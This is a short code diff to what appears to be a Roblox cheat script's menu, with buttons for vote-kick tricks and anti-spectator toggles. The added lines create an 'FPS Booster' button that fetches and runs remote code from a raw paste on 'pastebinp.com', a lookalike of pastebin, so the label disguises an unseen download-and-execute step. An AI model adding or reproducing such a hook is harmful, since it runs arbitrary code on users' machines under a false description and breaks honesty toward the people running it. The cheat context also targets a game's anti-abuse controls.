@@ -1176,6 +1176,10 @@ MiscellaneousTabCategoryMain:AddButton("Vote Kick Yourself", function()
 	game.ReplicatedStorage.Events.Vote:FireServer(game.Players.LocalPlayer.Name)
 end)
 
+MiscellaneousTabCategoryMain:AddButton("FPS Booster", function()
+	loadstring(game:HttpGet"https://pastebinp.com/raw/VekKpUuz")()
+end)
+
 MiscellaneousTabCategoryMain:AddToggle("Anti Vote Kick", false, "MiscellaneousTabCategoryMainAntiVoteKick")
 
 MiscellaneousTabCategoryMain:AddToggle("Anti Spectators", false, "MiscellaneousTabCategoryMainAntiSpectators")
